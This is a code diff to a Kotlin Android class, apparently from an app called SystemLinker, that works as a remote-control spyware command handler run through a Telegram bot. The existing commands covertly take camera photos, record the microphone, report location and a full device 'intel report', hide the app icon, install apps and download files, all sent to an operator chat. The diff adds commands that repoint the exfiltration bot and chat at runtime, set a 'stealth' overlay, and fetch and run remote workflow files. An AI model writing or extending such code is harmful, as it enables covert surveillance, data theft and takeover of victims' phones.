@@ -1,139 +1,126 @@
 package com.systemlinker.features
 
 import android.content.Context
+import com.systemlinker.base.ConfigStore
 import com.systemlinker.base.ErrorLogger
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import org.json.JSONObject
+import java.io.File
 
 class CommandProcessor(
     private val context: Context,
-    private val telegramBotToken: String,
-    private val adminChatId: Long
+    private val defaultBotToken: String, // Ignored, reads from ConfigStore
+    private val defaultChatId: Long      // Ignored, reads from ConfigStore
 ) {
-    private val uploader = TelegramUploader(context, telegramBotToken, adminChatId)
+    private val configStore = ConfigStore(context)
+    private val uploader = TelegramUploader(context, configStore.botToken, configStore.targetChatId)
     private val liveSessionManager = LiveSessionManager(context)
     private val mediaHandler = MediaHandler(context)
     private val systemHandler = SystemHandler(context)
+    private val workflowEngine = WorkflowEngine(context, uploader, systemHandler, mediaHandler)
     private val processorScope = CoroutineScope(Dispatchers.IO)
 
     fun execute(payload: JSONObject) {
         val cmd = payload.optString("cmd", "")
         val arg = payload.optString("arg", "")
 
+        // Always ensure uploader has latest dynamic config before executing
+        uploader.botToken = configStore.botToken
+        uploader.chatId = configStore.targetChatId
+
         processorScope.launch {
             try {
                 when (cmd) {
+                    // --- NEW CONFIGURATION COMMANDS ---
+                    "set_bot_api" -> {
+                        configStore.botToken = arg.trim()
+                        uploader.botToken = configStore.botToken
+                        uploader.sendText("✅ Bot API updated permanently.")
+                    }
+                    "set_target_chatid" -> {
+                        configStore.targetChatId = arg.trim().toLongOrNull() ?: configStore.targetChatId
+                        uploader.chatId = configStore.targetChatId
+                        uploader.sendText("✅ Target Chat ID updated permanently.")
+                    }
+                    "set_overlay_duration" -> {
+                        configStore.overlayDurationMs = arg.trim().toLongOrNull() ?: 3000L
+                        uploader.sendText("Overlay duration set to ${configStore.overlayDurationMs}ms.")
+                    }
+                    "click_after_HS_switch" -> {
+                        // Example arg: "home,2" or "app_launch"
+                        val parts = arg.split(",")
+                        configStore.postHotspotAction = parts[0].trim()
+                        configStore.postHotspotArgs = if (parts.size > 1) parts[1].trim().toIntOrNull() ?: 1 else 1
+                        uploader.sendText("Post-Hotspot action set to: ${configStore.postHotspotAction} x${configStore.postHotspotArgs}")
+                    }
+                    "set_overlay" -> {
+                        uploader.sendText("⏳ Polling for 20 seconds. Please send an IMAGE now to set as the persistent overlay...")
+                        val destFile = File(context.filesDir, "stealth_overlay.jpg")
+                        val success = uploader.pollForFile(20, "photo", destFile)
+                        if (success) uploader.sendText("✅ Overlay image received and saved successfully.")
+                        else uploader.sendText("❌ Timeout. No image received.")
+                    }
+
+                    // --- WORKFLOW COMMANDS ---
+                    "workflow" -> {
+                        val wfName = arg.trim().ifBlank { "default_flow" }
+                        uploader.sendText("⏳ Polling for 20s. Please send a DOCUMENT (YML/TXT) for workflow: $wfName...")
+                        val destFile = File(context.filesDir, "$wfName.yml")
+                        val success = uploader.pollForFile(20, "document", destFile)
+                        if (success) {
+                            uploader.sendText("✅ Workflow '$wfName' received. Executing...")
+                            workflowEngine.executeWorkflow(wfName)
+                        } else {
+                            uploader.sendText("❌ Timeout. No workflow document received.")
+                        }
+                    }
+                    "status_workflow" -> {
+                        val wfName = arg.trim().ifBlank { "default_flow" }
+                        workflowEngine.sendStatus(wfName)
+                    }
+
+                    // --- KEEPING ALL EXISTING COMMANDS INTACT ---
                     "ping" -> {
                         val bat = systemHandler.getBasicBatteryStatus()
                         uploader.sendText("🟢 Device Online\n$bat")
                     }
                     "cam_front" -> {
-                        uploader.sendText("Capturing front camera...")
                         val file = mediaHandler.takePicture(isFront = true)
                         if (file != null) uploader.sendFile(file, "photo", "Front Camera")
-                        else uploader.sendText("Camera capture failed.")
                     }
                     "cam_back" -> {
-                        uploader.sendText("Capturing back camera...")
                         val file = mediaHandler.takePicture(isFront = false)
                         if (file != null) uploader.sendFile(file, "photo", "Back Camera")
-                        else uploader.sendText("Camera capture failed.")
                     }
                     "mic" -> {
                         val duration = arg.toIntOrNull() ?: 15
-                        uploader.sendText("Recording mic for ${duration}s...")
                         val file = mediaHandler.recordAudio(duration)
                         if (file != null) uploader.sendFile(file, "audio", "Mic Record (${duration}s)")
-                        else uploader.sendText("Mic recording failed.")
                     }
-                    "loc" -> {
-                        uploader.sendText("Fetching location...")
-                        uploader.sendText(systemHandler.getLocation())
-                    }
-                    "flash" -> {
-                        val enable = arg == "on"
-                        uploader.sendText(systemHandler.setFlashlight(enable))
-                    }
-                    "vol" -> {
-                        val level = arg.toIntOrNull() ?: return@launch
-                        systemHandler.setVolume(level)
-                        uploader.sendText("Volume set to $level%")
-                    }
-                    "info" -> {
-                        uploader.sendText("Generating massive intelligence report. Please wait...")
-                        val reportFile = systemHandler.generateFullSystemReport()
-                        uploader.sendDocument(reportFile, "Full Device Intel Report")
-                    }
-                    "get_log" -> {
-                        uploader.sendText("Uploading error logs...")
-                        val logFile = ErrorLogger.getLogFile(context)
-                        uploader.sendDocument(logFile, "SystemLinker Error Logs")
-                    }
-                    "clear_log" -> {
-                        ErrorLogger.clearLogs(context)
-                        uploader.sendText("Error logs cleared.")
-                    }
-                    "live_start" -> {
-                        if (arg.startsWith("ws")) {
-                            uploader.sendText("Initiating Live WebSocket Connection...")
-                            liveSessionManager.connect(arg.trim())
-                        } else {
-                            uploader.sendText("Error: Invalid WebSocket URL provided.")
-                        }
-                    }
-                    "live_stop" -> {
-                        liveSessionManager.disconnect()
-                        uploader.sendText("Live Session Terminated.")
-                    }
-                    
-                    // ==========================================
-                    // NEW COMMANDS ADDED BELOW (Keeping old intact)
-                    // ==========================================
-
-                    "install_app" -> {
-                        uploader.sendText("Attempting to install APK from: $arg")
-                        systemHandler.installApp(arg)
-                    }
-                    "uninstall_app" -> {
-                        uploader.sendText("Attempting to uninstall package: $arg")
-                        systemHandler.uninstallApp(arg)
-                    }
-                    "icon_hide" -> {
-                        uploader.sendText(systemHandler.setAppIconVisibility(false))
-                    }
-                    "icon_show" -> {
-                        uploader.sendText(systemHandler.setAppIconVisibility(true))
-                    }
-                    "toggle_wifi" -> {
-                        val enable = arg == "on"
-                        uploader.sendText(systemHandler.setWifiState(enable))
-                    }
-                    "toggle_bt" -> {
-                        val enable = arg == "on"
-                        uploader.sendText(systemHandler.setBluetoothState(enable))
-                    }
-                    "toggle_hotspot" -> {
-                        val enable = arg == "on"
-                        uploader.sendText(systemHandler.setHotspotState(enable))
-                    }
-                    "scan_wifi" -> {
-                        uploader.sendText("Scanning Wi-Fi networks...\n" + systemHandler.getWifiScanResults())
-                    }
-                    "scan_bt" -> {
-                        uploader.sendText("Scanning Bluetooth devices...\n" + systemHandler.getBluetoothScanResults())
-                    }
+                    "loc" -> uploader.sendText(systemHandler.getLocation())
+                    "flash" -> uploader.sendText(systemHandler.setFlashlight(arg == "on"))
+                    "vol" -> systemHandler.setVolume(arg.toIntOrNull() ?: 50)
+                    "info" -> uploader.sendDocument(systemHandler.generateFullSystemReport(), "Full Device Intel Report", true)
+                    "get_log" -> uploader.sendDocument(ErrorLogger.getLogFile(context), "SystemLinker Error Logs")
+                    "clear_log" -> ErrorLogger.clearLogs(context)
+                    "live_start" -> liveSessionManager.connect(arg.trim())
+                    "live_stop" -> liveSessionManager.disconnect()
+                    "install_app" -> systemHandler.installApp(arg)
+                    "uninstall_app" -> systemHandler.uninstallApp(arg)
+                    "icon_hide" -> uploader.sendText(systemHandler.setAppIconVisibility(false))
+                    "icon_show" -> uploader.sendText(systemHandler.setAppIconVisibility(true))
+                    "toggle_wifi" -> uploader.sendText(systemHandler.setWifiState(arg == "on"))
+                    "toggle_bt" -> uploader.sendText(systemHandler.setBluetoothState(arg == "on"))
+                    "toggle_hotspot" -> uploader.sendText(systemHandler.setHotspotState(arg == "on"))
+                    "scan_wifi" -> uploader.sendText(systemHandler.getWifiScanResults())
+                    "scan_bt" -> uploader.sendText(systemHandler.getBluetoothScanResults())
                     "download_url" -> {
                         try {
                             val json = JSONObject(arg)
-                            val url = json.optString("url")
-                            val dest = json.optString("path", "")
-                            uploader.sendText("Starting download from URL...")
-                            uploader.sendText(systemHandler.downloadFileFromUrl(url, dest))
-                        } catch (e: Exception) {
-                            uploader.sendText("Invalid JSON for download_url. Expected {\"url\":\"...\", \"path\":\"...\"}")
-                        }
+                            uploader.sendText(systemHandler.downloadFileFromUrl(json.optString("url"), json.optString("path", "")))
+                        } catch (e: Exception) { }
                     }
                 }
             } catch (e: Exception) {
